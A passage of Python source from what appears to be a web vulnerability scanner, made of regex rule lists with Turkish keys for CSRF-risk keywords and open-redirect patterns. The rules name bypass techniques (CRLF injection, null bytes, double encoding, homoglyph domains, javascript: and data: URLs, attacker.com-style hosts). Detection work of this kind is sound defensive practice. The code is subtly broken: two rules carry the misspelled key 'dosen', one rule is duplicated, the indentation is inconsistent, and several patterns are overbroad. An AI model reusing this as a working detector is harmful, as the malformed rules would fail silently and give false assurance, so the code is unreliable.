        {"desen": r"data.*recovery", "guven": 0.8, "aciklama": "Data recovery CSRF riski"},
        
        # Multi-tenant Desenleri
        {"desen": r"tenant.*switch", "guven": 0.8, "aciklama": "Tenant switch CSRF riski"},
        {"desen": r"organization.*change", "guven": 0.8, "aciklama": "Organization change"},
        {"desen": r"workspace.*create", "guven": 0.7, "aciklama": "Workspace creation"},
        {"desen": r"team.*invite", "guven": 0.7, "aciklama": "Team invite CSRF riski"},
        {"desen": r"role.*assignment", "guven": 0.8, "aciklama": "Role assignment CSRF riski"},
        
        # Workflow ve Automation Desenleri
        {"desen": r"workflow.*trigger", "guven": 0.7, "aciklama": "Workflow trigger"},
        {"desen": r"automation.*execute", "guven": 0.8, "aciklama": "Automation execute"},
        {"desen": r"scheduler.*job.*run", "guven": 0.7, "aciklama": "Scheduled job run"},
        {"desen": r"cron.*job.*trigger", "guven": 0.7, "aciklama": "Cron job trigger"},
        {"desen": r"batch.*process", "guven": 0.7, "aciklama": "Batch process CSRF riski"},
        
        # API Rate Limiting Desenleri
        {"desen": r"rate.*limit.*reset", "guven": 0.7, "aciklama": "Rate limit reset"},
        {"desen": r"throttle.*disable", "guven": 0.8, "aciklama": "Throttle disable CSRF riski"},
        {"desen": r"quota.*increase", "guven": 0.8, "aciklama": "Quota increase"},
        {"desen": r"api.*limit.*bypass", "guven": 0.9, "aciklama": "API limit bypass"},
        {"desen": r"request.*per.*minute", "guven": 0.5, "aciklama": "RPM configuration"},
        
        # Notification System Desenleri
        {"desen": r"notification.*broadcast", "guven": 0.6, "aciklama": "Broadcast notification"},
        {"desen": r"alert.*create", "guven": 0.6, "aciklama": "Alert creation CSRF riski"},
        {"desen": r"reminder.*set", "guven": 0.5, "aciklama": "Reminder setting"},
        {"desen": r"announcement.*publish", "guven": 0.7, "aciklama": "Announcement publish"},
        {"desen": r"push.*notification.*send", "guven": 0.6, "aciklama": "Push notification send"},
        
        # Search ve Indexing Desenleri
        {"desen": r"search.*index.*rebuild", "guven": 0.8, "aciklama": "Search index rebuild"},
        {"desen": r"elasticsearch.*update", "guven": 0.7, "aciklama": "Elasticsearch update"},
        {"dosen": r"solr.*commit", "guven": 0.6, "aciklama": "Solr commit operation"},
        {"desen": r"lucene.*index", "guven": 0.6, "aciklama": "Lucene indexing"},
        {"desen": r"full.*text.*search", "guven": 0.5, "aciklama": "Full text search"},
        
        # Integration ve Webhook Desenleri
        {"desen": r"webhook.*trigger", "guven": 0.7, "aciklama": "Webhook trigger CSRF riski"},
        {"desen": r"third.*party.*api", "guven": 0.6, "aciklama": "Third party API call"},
        {"desen": r"external.*service.*call", "guven": 0.6, "aciklama": "External service call"},
        {"desen": r"callback.*url", "guven": 0.7, "aciklama": "Callback URL CSRF riski"},
        {"dosen": r"api.*integration", "guven": 0.6, "aciklama": "API integration"},
        
        # Performance Monitoring Desenleri
        {"desen": r"performance.*metric", "guven": 0.4, "aciklama": "Performance metric"},
        {"desen": r"apm.*agent", "guven": 0.3, "aciklama": "APM agent"},
        {"desen": r"memory.*usage.*alert", "guven": 0.5, "aciklama": "Memory alert"},
        {"desen": r"cpu.*threshold", "guven": 0.5, "aciklama": "CPU threshold"},
        {"desen": r"response.*time.*monitor", "guven": 0.4, "aciklama": "Response time monitoring"},
        
        # Feature Flag Desenleri
        {"desen": r"feature.*flag.*toggle", "guven": 0.7, "aciklama": "Feature flag toggle"},
        {"desen": r"experiment.*start", "guven": 0.6, "aciklama": "Experiment start"},
        {"desen": r"ab.*test.*create", "guven": 0.6, "aciklama": "A/B test creation"},
        {"desen": r"rollout.*percentage", "guven": 0.7, "aciklama": "Rollout percentage"},
        {"desen": r"canary.*deployment", "guven": 0.7, "aciklama": "Canary deployment"},
        
        # Document Management Desenleri
        {"desen": r"document.*upload", "guven": 0.7, "aciklama": "Document upload CSRF riski"},
        {"desen": r"file.*sharing", "guven": 0.7, "aciklama": "File sharing CSRF riski"},
        {"desen": r"document.*version", "guven": 0.6, "aciklama": "Document versioning"},
        {"desen": r"pdf.*generate", "guven": 0.6, "aciklama": "PDF generation"},
        {"desen": r"document.*export", "guven": 0.6, "aciklama": "Document export"},
        
        # Quality Assurance Desenleri
        {"desen": r"test.*suite.*run", "guven": 0.6, "aciklama": "Test suite execution"},
        {"desen": r"qa.*environment.*deploy", "guven": 0.7, "aciklama": "QA deployment"},
        {"desen": r"automated.*test.*trigger", "guven": 0.6, "aciklama": "Automated test trigger"},
        {"desen": r"regression.*test", "guven": 0.6, "aciklama": "Regression test"},
        {"desen": r"load.*test.*start", "guven": 0.7, "aciklama": "Load test start"},
        
        # Inventory Management Desenleri
        {"desen": r"inventory.*update", "guven": 0.7, "aciklama": "Inventory update CSRF riski"},
        {"desen": r"stock.*adjustment", "guven": 0.8, "aciklama": "Stock adjustment"},
        {"desen": r"product.*catalog.*modify", "guven": 0.7, "aciklama": "Catalog modification"},
        {"desen": r"price.*update", "guven": 0.8, "aciklama": "Price update CSRF riski"},
        {"desen": r"supplier.*order", "guven": 0.8, "aciklama": "Supplier order CSRF riski"},
        
        # Customer Support Desenleri
        {"desen": r"ticket.*create", "guven": 0.6, "aciklama": "Support ticket creation"},
        {"desen": r"ticket.*close", "guven": 0.7, "aciklama": "Ticket close CSRF riski"},
        {"desen": r"customer.*refund", "guven": 0.9, "aciklama": "Customer refund CSRF riski"},
        {"desen": r"support.*escalate", "guven": 0.7, "aciklama": "Support escalation"},
        {"desen": r"knowledge.*base.*update", "guven": 0.6, "aciklama": "KB update CSRF riski"},
        
        # Event Management Desenleri
        {"desen": r"event.*create", "guven": 0.6, "aciklama": "Event creation CSRF riski"},
        {"desen": r"calendar.*booking", "guven": 0.7, "aciklama": "Calendar booking"},
        {"desen": r"meeting.*schedule", "guven": 0.6, "aciklama": "Meeting scheduling"},
        {"desen": r"appointment.*cancel", "guven": 0.7, "aciklama": "Appointment cancel"},
        {"desen": r"event.*registration", "guven": 0.7, "aciklama": "Event registration CSRF riski"},
        
        # Resource Management Desenleri
        {"desen": r"resource.*allocation", "guven": 0.7, "aciklama": "Resource allocation"},
        {"desen": r"capacity.*planning", "guven": 0.6, "aciklama": "Capacity planning"},
        {"desen": r"server.*scaling", "guven": 0.8, "aciklama": "Server scaling CSRF riski"},
        {"desen": r"auto.*scaling.*config", "guven": 0.7, "aciklama": "Auto scaling config"},
        {"desen": r"resource.*limit.*update", "guven": 0.7, "aciklama": "Resource limit update"},
        
        # Health Check Desenleri
        {"desen": r"health.*check.*endpoint", "guven": 0.3, "aciklama": "Health check endpoint"},
        {"desen": r"service.*status", "guven": 0.3, "aciklama": "Service status check"},
        {"desen": r"uptime.*monitor", "guven": 0.4, "aciklama": "Uptime monitoring"},
        {"desen": r"dependency.*check", "guven": 0.4, "aciklama": "Dependency check"},
        {"desen": r"readiness.*probe", "guven": 0.3, "aciklama": "Readiness probe"},
        
        # Legacy System Desenleri
        {"desen": r"legacy.*api.*call", "guven": 0.7, "aciklama": "Legacy API CSRF riski"},
        {"desen": r"mainframe.*transaction", "guven": 0.8, "aciklama": "Mainframe transaction"},
        {"desen": r"cobol.*program.*call", "guven": 0.7, "aciklama": "COBOL program call"},
        {"desen": r"soap.*service", "guven": 0.6, "aciklama": "SOAP service call"},
        {"desen": r"xml.*rpc", "guven": 0.6, "aciklama": "XML-RPC call"},
        
        # Advanced Security Patterns
        {"desen": r"zero.*trust.*verify", "guven": 0.3, "aciklama": "Zero trust verification"},
        {"desen": r"mutual.*tls", "guven": 0.2, "aciklama": "Mutual TLS authentication"},
        {"desen": r"certificate.*pinning", "guven": 0.2, "aciklama": "Certificate pinning"},
        {"desen": r"oauth2.*pkce", "guven": 0.2, "aciklama": "OAuth2 PKCE flow"},
        {"desen": r"jwt.*signature.*verify", "guven": 0.2, "aciklama": "JWT signature verification"},
        
        # Final Critical Patterns
        {"desen": r"admin.*privilege.*escalation", "guven": 0.95, "aciklama": "Privilege escalation CSRF riski"},
        {"desen": r"system.*shutdown", "guven": 0.95, "aciklama": "System shutdown CSRF riski"},
        {"desen": r"emergency.*stop", "guven": 0.95, "aciklama": "Emergency stop CSRF riski"},
        {"desen": r"factory.*reset", "guven": 0.95, "aciklama": "Factory reset CSRF riski"},
        {"desen": r"master.*key.*reset", "guven": 0.95, "aciklama": "Master key reset CSRF riski"},
        {"desen": r"root.*access.*grant", "guven": 0.95, "aciklama": "Root access grant CSRF riski"},
        {"desen": r"superuser.*create", "guven": 0.95, "aciklama": "Superuser creation CSRF riski"},
        {"desen": r"security.*policy.*disable", "guven": 0.95, "aciklama": "Security policy disable"},
        {"desen": r"audit.*log.*clear", "guven": 0.9, "aciklama": "Audit log clear CSRF riski"},
                {"desen": r"csrf_token", "guven": 0.85, "aciklama": "CSRF token eksik"},
            ],
            ZafiyetTipi.OPEN_REDIRECT: [
    {"desen": r"redirect.*?http", "guven": 0.85, "aciklama": "Açık yönlendirme HTTP içeriyor"},
    # Temel HTTP/HTTPS yönlendirmeleri
        {"desen": r"redirect.*?http", "guven": 0.85, "aciklama": "Açık yönlendirme HTTP içeriyor"},
        {"desen": r"window\.location\s*=\s*['\"]http", "guven": 0.8, "aciklama": "JavaScript açık yönlendirme"},
        {"desen": r"location\.href\s*=\s*['\"]https?://", "guven": 0.9, "aciklama": "Location.href ile dış URL yönlendirme"},
        {"desen": r"location\.replace\s*\(\s*['\"]https?://", "guven": 0.85, "aciklama": "Location replace ile dış domain"},
        {"desen": r"window\.open\s*\(\s*['\"]https?://", "guven": 0.7, "aciklama": "Window.open ile dış URL"},
        
        # PHP yönlendirmeleri
        {"desen": r"header\s*\(\s*['\"]Location:\s*https?://", "guven": 0.9, "aciklama": "PHP header Location yönlendirme"},
        {"desen": r"\$_GET\[.*?\].*?header.*?Location", "guven": 0.95, "aciklama": "GET parametresi ile PHP yönlendirme"},
        {"desen": r"\$_POST\[.*?\].*?header.*?Location", "guven": 0.95, "aciklama": "POST parametresi ile PHP yönlendirme"},
        {"desen": r"\$_REQUEST\[.*?\].*?header.*?Location", "guven": 0.95, "aciklama": "REQUEST parametresi ile PHP yönlendirme"},
        {"desen": r"wp_redirect\s*\(\s*\$_", "guven": 0.9, "aciklama": "WordPress wp_redirect ile kullanıcı girdisi"},
        
        # ASP.NET yönlendirmeleri
        {"desen": r"Response\.Redirect\s*\(\s*Request\.", "guven": 0.95, "aciklama": "ASP.NET Response.Redirect ile Request"},
        {"desen": r"Response\.Redirect\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "ASP.NET sabit URL yönlendirme"},
        {"desen": r"Server\.Transfer\s*\(\s*Request\.", "guven": 0.85, "aciklama": "ASP.NET Server.Transfer ile Request"},
        {"desen": r"HttpContext\.Current\.Response\.Redirect", "guven": 0.8, "aciklama": "HttpContext ile yönlendirme"},
        {"desen": r"RedirectToAction.*?Request\[", "guven": 0.9, "aciklama": "MVC RedirectToAction ile Request"},
        
        # Java/JSP yönlendirmeleri
        {"desen": r"response\.sendRedirect\s*\(\s*request\.", "guven": 0.95, "aciklama": "Java sendRedirect ile request"},
        {"desen": r"RequestDispatcher.*?forward.*?request\.", "guven": 0.8, "aciklama": "RequestDispatcher forward"},
        {"desen": r"response\.sendRedirect\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Java sabit URL yönlendirme"},
        {"desen": r"getParameter\s*\(\s*['\"].*?redirect", "guven": 0.85, "aciklama": "Java getParameter ile redirect"},
        {"desen": r"@RequestParam.*?redirect.*?sendRedirect", "guven": 0.9, "aciklama": "Spring RequestParam redirect"},
        
        # Node.js/Express yönlendirmeleri
        {"desen": r"res\.redirect\s*\(\s*req\.", "guven": 0.95, "aciklama": "Express res.redirect ile req"},
        {"desen": r"res\.redirect\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Express sabit URL yönlendirme"},
        {"desen": r"response\.writeHead\s*\(\s*30[12]", "guven": 0.75, "aciklama": "Node.js manuel redirect header"},
        {"desen": r"req\.query\..*?res\.redirect", "guven": 0.9, "aciklama": "Express query parameter redirect"},
        {"desen": r"req\.params\..*?res\.redirect", "guven": 0.9, "aciklama": "Express params redirect"},
        
        # Python/Django/Flask yönlendirmeleri
        {"desen": r"HttpResponseRedirect\s*\(\s*request\.", "guven": 0.95, "aciklama": "Django HttpResponseRedirect ile request"},
        {"desen": r"redirect\s*\(\s*request\.GET", "guven": 0.95, "aciklama": "Django redirect ile GET"},
        {"desen": r"redirect\s*\(\s*request\.POST", "guven": 0.95, "aciklama": "Django redirect ile POST"},
        {"desen": r"flask\.redirect\s*\(\s*request\.", "guven": 0.95, "aciklama": "Flask redirect ile request"},
        {"desen": r"return redirect\s*\(\s*request\.args", "guven": 0.95, "aciklama": "Flask redirect ile args"},
        
        # Ruby/Rails yönlendirmeleri
        {"desen": r"redirect_to\s+params\[", "guven": 0.95, "aciklama": "Rails redirect_to ile params"},
        {"desen": r"redirect_to\s+request\[", "guven": 0.95, "aciklama": "Rails redirect_to ile request"},
        {"desen": r"redirect_to\s+['\"]https?://", "guven": 0.8, "aciklama": "Rails sabit URL yönlendirme"},
        {"desen": r"response\.redirect\s*\(\s*params\[", "guven": 0.9, "aciklama": "Ruby response redirect params"},
        {"desen": r"send_data.*?redirect", "guven": 0.7, "aciklama": "Rails send_data redirect"},
        
        # HTML Meta refresh
        {"desen": r"<meta[^>]*http-equiv=['\"]refresh['\"][^>]*url=https?://", "guven": 0.85, "aciklama": "HTML meta refresh dış URL"},
        {"desen": r"<meta[^>]*http-equiv=['\"]refresh['\"][^>]*url=\$", "guven": 0.9, "aciklama": "HTML meta refresh değişken URL"},
        {"desen": r"content=['\"][0-9]+;url=https?://", "guven": 0.8, "aciklama": "Meta refresh content dış URL"},
        {"desen": r"content=['\"][0-9]+;url=<%=", "guven": 0.85, "aciklama": "Meta refresh dinamik URL"},
        {"desen": r"content=['\"][0-9]+;url=\{\{", "guven": 0.85, "aciklama": "Meta refresh template URL"},
        
        # JavaScript window methods
        {"desen": r"window\.location\.assign\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "JavaScript assign dış URL"},
        {"desen": r"window\.location\.replace\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "JavaScript replace dış URL"},
        {"desen": r"document\.location\s*=\s*['\"]https?://", "guven": 0.8, "aciklama": "Document location dış URL"},
        {"desen": r"self\.location\s*=\s*['\"]https?://", "guven": 0.8, "aciklama": "Self location dış URL"},
        {"desen": r"top\.location\s*=\s*['\"]https?://", "guven": 0.8, "aciklama": "Top location dış URL"},
        
        # URL parametreli yönlendirmeler
        {"desen": r"redirect.*?url=https?://", "guven": 0.9, "aciklama": "URL parametresi ile redirect"},
        {"desen": r"goto.*?url=https?://", "guven": 0.85, "aciklama": "Goto parametresi ile dış URL"},
        {"desen": r"return.*?url=https?://", "guven": 0.8, "aciklama": "Return URL parametresi"},
        {"desen": r"next.*?=.*?https?://", "guven": 0.85, "aciklama": "Next parametresi dış URL"},
        {"desen": r"target.*?=.*?https?://", "guven": 0.8, "aciklama": "Target parametresi dış URL"},
        
        # Form action yönlendirmeleri
        {"desen": r"<form[^>]*action=['\"]https?://", "guven": 0.75, "aciklama": "Form action dış URL"},
        {"desen": r"action=['\"][^'\"]*\$_GET", "guven": 0.9, "aciklama": "Form action GET parametresi"},
        {"desen": r"action=['\"][^'\"]*\$_POST", "guven": 0.9, "aciklama": "Form action POST parametresi"},
        {"desen": r"action=['\"][^'\"]*<%=", "guven": 0.85, "aciklama": "Form action dinamik değer"},
        {"desen": r"action=['\"][^'\"]*\{\{", "guven": 0.85, "aciklama": "Form action template değer"},
        
        # Link href yönlendirmeleri
        {"desen": r"<a[^>]*href=['\"]https?://[^'\"]*\$", "guven": 0.8, "aciklama": "Link href değişken dış URL"},
        {"desen": r"href=['\"][^'\"]*\?.*?redirect=https?://", "guven": 0.9, "aciklama": "Link href redirect parametresi"},
        {"desen": r"href=['\"][^'\"]*<%=.*?https?://", "guven": 0.85, "aciklama": "Link href dinamik dış URL"},
        {"desen": r"href=['\"][^'\"]*\{\{.*?https?://", "guven": 0.85, "aciklama": "Link href template dış URL"},
        {"desen": r"createElement.*?href.*?https?://", "guven": 0.75, "aciklama": "createElement href dış URL"},
        
        # AJAX/XHR yönlendirmeleri
        {"desen": r"xhr\.open\s*\(\s*['\"]GET['\"][^)]*https?://", "guven": 0.75, "aciklama": "XHR GET dış URL"},
        {"desen": r"xhr\.open\s*\(\s*['\"]POST['\"][^)]*https?://", "guven": 0.75, "aciklama": "XHR POST dış URL"},
        {"desen": r"\$\.get\s*\(\s*['\"]https?://", "guven": 0.7, "aciklama": "jQuery GET dış URL"},
        {"desen": r"\$\.post\s*\(\s*['\"]https?://", "guven": 0.7, "aciklama": "jQuery POST dış URL"},
        {"desen": r"fetch\s*\(\s*['\"]https?://", "guven": 0.7, "aciklama": "Fetch API dış URL"},
        
        # Framework özel yönlendirmeler
        {"desen": r"this\.\$router\.push\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Vue Router push dış URL"},
        {"desen": r"history\.push\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "React Router history push"},
        {"desen": r"navigate\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Navigation API dış URL"},
        {"desen": r"router\.navigate\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Router navigate dış URL"},
        {"desen": r"location\.go\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Location go dış URL"},
        
        # SQL injection ile redirect
        {"desen": r"SELECT.*?redirect.*?https?://", "guven": 0.85, "aciklama": "SQL ile redirect URL"},
        {"desen": r"UPDATE.*?redirect_url.*?https?://", "guven": 0.8, "aciklama": "SQL UPDATE redirect URL"},
        {"desen": r"INSERT.*?redirect.*?https?://", "guven": 0.8, "aciklama": "SQL INSERT redirect URL"},
        {"desen": r"WHERE.*?redirect.*?LIKE.*?https?://", "guven": 0.85, "aciklama": "SQL WHERE redirect LIKE"},
        {"desen": r"ORDER BY.*?redirect.*?https?://", "guven": 0.75, "aciklama": "SQL ORDER BY redirect"},
        
        # Template engine yönlendirmeleri
        {"desen": r"\{\{.*?redirect.*?https?://.*?\}\}", "guven": 0.85, "aciklama": "Template redirect dış URL"},
        {"desen": r"<%.*?redirect.*?https?://.*?%>", "guven": 0.85, "aciklama": "ASP template redirect"},
        {"desen": r"\{%.*?redirect.*?https?://.*?%\}", "guven": 0.85, "aciklama": "Jinja2 redirect dış URL"},
        {"desen": r"@.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Razor syntax redirect"},
        {"desen": r"th:href=['\"]https?://", "guven": 0.75, "aciklama": "Thymeleaf href dış URL"},
        
        # Cookie/Session yönlendirmeleri
        {"desen": r"setcookie.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Cookie ile redirect URL"},
        {"desen": r"\$_SESSION.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Session ile redirect URL"},
        {"desen": r"session\.setAttribute.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Java session redirect"},
        {"desen": r"HttpSession.*?redirect.*?https?://", "guven": 0.8, "aciklama": "HttpSession redirect"},
        {"desen": r"req\.session.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Express session redirect"},
        
        # API endpoint yönlendirmeleri
        {"desen": r"/api/.*?redirect.*?https?://", "guven": 0.8, "aciklama": "API endpoint redirect"},
        {"desen": r"@RequestMapping.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Spring RequestMapping redirect"},
        {"desen": r"@GetMapping.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Spring GetMapping redirect"},
        {"desen": r"@PostMapping.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Spring PostMapping redirect"},
        {"desen": r"app\.get.*?redirect.*?https?://", "guven": 0.8, "aciklama": "Express GET route redirect"},
        
        # Mobile app yönlendirmeleri
        {"desen": r"intent://.*?https?://", "guven": 0.85, "aciklama": "Android intent dış URL"},
        {"desen": r"startActivity.*?https?://", "guven": 0.8, "aciklama": "Android startActivity dış URL"},
        {"desen": r"openURL.*?https?://", "guven": 0.8, "aciklama": "iOS openURL dış URL"},
        {"desen": r"UIApplication.*?openURL.*?https?://", "guven": 0.85, "aciklama": "iOS UIApplication openURL"},
        {"desen": r"canOpenURL.*?https?://", "guven": 0.75, "aciklama": "iOS canOpenURL dış URL"},
        
        # WebView yönlendirmeleri
        {"desen": r"webView\.loadUrl\s*\(\s*['\"]https?://", "guven": 0.8, "aciklama": "Android WebView loadUrl"},
        {"desen": r"WKWebView.*?loadRequest.*?https?://", "guven": 0.8, "aciklama": "iOS WKWebView loadRequest"},
        {"desen": r"UIWebView.*?loadRequest.*?https?://", "guven": 0.8, "aciklama": "iOS UIWebView loadRequest"},
        {"desen": r"webview.*?src=['\"]https?://", "guven": 0.75, "aciklama": "WebView src dış URL"},
        {"desen": r"iframe.*?src=['\"]https?://", "guven": 0.7, "aciklama": "Iframe src dış URL"},
        
        # Protokol handler yönlendirmeleri
        {"desen": r"registerProtocolHandler.*?https?://", "guven": 0.8, "aciklama": "Protocol handler dış URL"},
        {"desen": r"custom://.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Custom protocol redirect"},
        {"desen": r"file://.*?redirect.*?https?://", "guven": 0.9, "aciklama": "File protocol redirect"},
        {"desen": r"data:.*?redirect.*?https?://", "guven": 0.85, "aciklama": "Data URL redirect"},
        {"desen": r"javascript:.*?location.*?https?://", "guven": 0.9, "aciklama": "JavaScript URL redirect"},
        
        # Base64 encoded redirects
        {"desen": r"atob\s*\([^)]*https?://", "guven": 0.85, "aciklama": "Base64 decode dış URL"},
        {"desen": r"base64_decode.*?https?://", "guven": 0.85, "aciklama": "PHP base64_decode dış URL"},
        {"desen": r"Buffer\.from.*?base64.*?https?://", "guven": 0.85, "aciklama": "Node.js Buffer base64 dış URL"},
        {"desen": r"decode\s*\([^)]*https?://", "guven": 0.8, "aciklama": "Generic decode dış URL"},
        {"desen": r"unescape.*?https?://", "guven": 0.8, "aciklama": "Unescape dış URL"},
        
        # URL encoding bypasses
        {"desen": r"redirect.*?%68%74%74%70", "guven": 0.9, "aciklama": "URL encoded http redirect"},
        {"desen": r"redirect.*?%2F%2F", "guven": 0.85, "aciklama": "URL encoded // redirect"},
        {"desen": r"redirect.*?%3A%2F%2F", "guven": 0.9, "aciklama": "URL encoded :// redirect"},
        {"desen": r"decodeURIComponent.*?https?://", "guven": 0.85, "aciklama": "decodeURIComponent dış URL"},
        {"desen": r"urldecode.*?https?://", "guven": 0.85, "aciklama": "PHP urldecode dış URL"},
        
        # Double encoding bypasses
        {"desen": r"redirect.*?%25[0-9A-Fa-f]{2}", "guven": 0.85, "aciklama": "Double URL encoding redirect"},
        {"desen": r"redirect.*?%%[0-9A-Fa-f]{2}", "guven": 0.8, "aciklama": "Double percent encoding"},
        {"desen": r"redirect.*?\\u[0-9A-Fa-f]{4}", "guven": 0.8, "aciklama": "Unicode encoding redirect"},
        {"desen": r"redirect.*?\\x[0-9A-Fa-f]{2}", "guven": 0.8, "aciklama": "Hex encoding redirect"},
        {"desen": r"redirect.*?&#[0-9]+;", "guven": 0.8, "aciklama": "HTML entity encoding redirect"},
        
        # Protocol-relative URLs
        {"desen": r"redirect.*?//[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.9, "aciklama": "Protocol-relative URL redirect"},
        {"desen": r"location.*?//[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.9, "aciklama": "Protocol-relative location"},
        {"desen": r"href=['\"]//[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.85, "aciklama": "Protocol-relative href"},
        {"desen": r"src=['\"]//[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.8, "aciklama": "Protocol-relative src"},
        {"desen": r"action=['\"]//[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "guven": 0.85, "aciklama": "Protocol-relative action"},
        
        # IP address redirects
        {"desen": r"redirect.*?https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", "guven": 0.95, "aciklama": "IP adresi redirect"},
        {"desen": r"location.*?https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", "guven": 0.95, "aciklama": "IP adresi location"},
        {"desen": r"href=['\"]https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", "guven": 0.9, "aciklama": "IP adresi href"},
        {"desen": r"//[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", "guven": 0.9, "aciklama": "Protocol-relative IP"},
        {"desen": r"redirect.*?localhost", "guven": 0.85, "aciklama": "Localhost redirect"},
        
        # Localhost variations
        {"desen": r"redirect.*?127\.0\.0\.1", "guven": 0.9, "aciklama": "127.0.0.1 redirect"},
        {"desen": r"redirect.*?0\.0\.0\.0", "guven": 0.85, "aciklama": "0.0.0.0 redirect"},
        {"desen": r"redirect.*?::1", "guven": 0.85, "aciklama": "IPv6 localhost redirect"},
        {"desen": r"redirect.*?0x[0-9A-Fa-f]+", "guven": 0.9, "aciklama": "Hex IP address redirect"},
        {"desen": r"redirect.*?[0-9]+\.[0-9]+", "guven": 0.8, "aciklama": "Decimal IP redirect"},
        
        # Subdomain bypasses
        {"desen": r"redirect.*?[a-zA-Z0-9.-]*\.attacker\.com", "guven": 0.95, "aciklama": "Attacker subdomain redirect"},
        {"desen": r"redirect.*?evil\.[a-zA-Z0-9.-]+", "guven": 0.9, "aciklama": "Evil subdomain redirect"},
        {"desen": r"redirect.*?malicious\.[a-zA-Z0-9.-]+", "guven": 0.9, "aciklama": "Malicious subdomain redirect"},
        {"desen": r"redirect.*?phish\.[a-zA-Z0-9.-]+", "guven": 0.95, "aciklama": "Phishing subdomain redirect"},
        {"desen": r"redirect.*?fake\.[a-zA-Z0-9.-]+", "guven": 0.9, "aciklama": "Fake subdomain redirect"},
        
        # International domain names
        {"desen": r"redirect.*?xn--[a-zA-Z0-9.-]+", "guven": 0.9, "aciklama": "Punycode domain redirect"},
        {"desen": r"redirect.*?[а-я]+\.[a-zA-Z]{2,}", "guven": 0.85, "aciklama": "Cyrillic domain redirect"},
        {"desen": r"redirect.*?[ñáéíóú]+\.[a-zA-Z]{2,}", "guven": 0.8, "aciklama": "Accented domain redirect"},
        {"desen": r"redirect.*?[αβγδε]+\.[a-zA-Z]{2,}", "guven": 0.85, "aciklama": "Greek domain redirect"},
        {"desen": r"redirect.*?[一二三四五]+\.[a-zA-Z]{2,}", "guven": 0.85, "aciklama": "Chinese domain redirect"},
        
        # Path traversal combinations
        {"desen": r"redirect.*?\.\./.*?https?://", "guven": 0.9, "aciklama": "Path traversal redirect"},
        {"desen": r"redirect.*?\.\.\\.*?https?://", "guven": 0.9, "aciklama": "Windows path traversal redirect"},
        {"desen": r"redirect.*?%2e%2e%2f.*?https?://", "guven": 0.9, "aciklama": "Encoded path traversal redirect"},
        {"desen": r"redirect.*?%2e%2e\\.*?https?://", "guven": 0.9, "aciklama": "Encoded Windows traversal redirect"},
        {"desen": r"redirect.*?\.\.%2f.*?https?://", "guven": 0.9, "aciklama": "Mixed encoding traversal"},
        
        # Null byte bypasses
        {"desen": r"redirect.*?%00.*?https?://", "guven": 0.9, "aciklama": "Null byte bypass redirect"},
        {"desen": r"redirect.*?\\0.*?https?://", "guven": 0.9, "aciklama": "Null char bypass redirect"},
        {"desen": r"redirect.*?\x00.*?https?://", "guven": 0.9, "aciklama": "Hex null bypass redirect"},
        {"desen": r"redirect.*?\\u0000.*?https?://", "guven": 0.9, "aciklama": "Unicode null bypass"},
        {"desen": r"redirect.*?\0.*?https?://", "guven": 0.9, "aciklama": "C-style null bypass"},
        
        # CRLF injection
        {"desen": r"redirect.*?%0d%0a.*?https?://", "guven": 0.95, "aciklama": "CRLF injection redirect"},
        {"desen": r"redirect.*?\\r\\n.*?https?://", "guven": 0.95, "aciklama": "CRLF chars redirect"},
        {"desen": r"redirect.*?%0a.*?https?://", "guven": 0.9, "aciklama": "LF injection redirect"},
        {"desen": r"redirect.*?%0d.*?https?://", "guven": 0.9, "aciklama": "CR injection redirect"},
        {"desen": r"redirect.*?\\n.*?https?://", "guven": 0.9, "aciklama": "Newline injection redirect"},
        
        # Data URL bypasses
        {"desen": r"redirect.*?data:text/html.*?https?://", "guven": 0.9, "aciklama": "Data URL HTML redirect"},
        {"desen": r"redirect.*?data:text/javascript.*?https?://", "guven": 0.95, "aciklama": "Data URL JS redirect"},
        {"desen": r"redirect.*?data:application/.*?https?://", "guven": 0.9, "aciklama": "Data URL app redirect"},
        {"desen": r"redirect.*?data:image/svg.*?https?://", "guven": 0.9, "aciklama": "Data URL SVG redirect"},
        {"desen": r"redirect.*?data:.*?base64.*?https?://", "guven": 0.9, "aciklama": "Data URL base64 redirect"},
        
        # JavaScript URL bypasses
        {"desen": r"redirect.*?javascript:.*?location.*?https?://", "guven": 0.95, "aciklama": "JavaScript URL location"},
        {"desen": r"redirect.*?javascript:.*?window\.open.*?https?://", "guven": 0.95, "aciklama": "JavaScript URL window.open"},
        {"desen": r"redirect.*?javascript:.*?document\.location.*?https?://", "guven": 0.95, "aciklama": "JavaScript URL document.location"},
        {"desen": r"redirect.*?javascript:.*?top\.location.*?https?://", "guven": 0.95, "aciklama": "JavaScript URL top.location"},
        {"desen": r"redirect.*?javascript:.*?parent\.location.*?https?://", "guven": 0.95, "aciklama": "JavaScript URL parent.location"},
        
        # VBScript URL bypasses
        {"desen": r"redirect.*?vbscript:.*?location.*?https?://", "guven": 0.9, "aciklama": "VBScript URL location"},
        {"desen": r"redirect.*?vbscript:.*?window\.open.*?https?://", "guven": 0.9, "aciklama": "VBScript URL window.open"},
